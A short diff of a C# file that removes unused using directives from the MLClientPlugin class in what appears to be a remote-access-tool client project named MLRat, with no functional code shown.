@@ -1,12 +1,7 @@
 ﻿using MLRat.Client;
 using MLRatClient.Cryptography;
 using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Reflection;
-using System.Text;
-using System.Threading.Tasks;
-
 namespace MLRatClient.Plugin
 {
     class MLClientPlugin
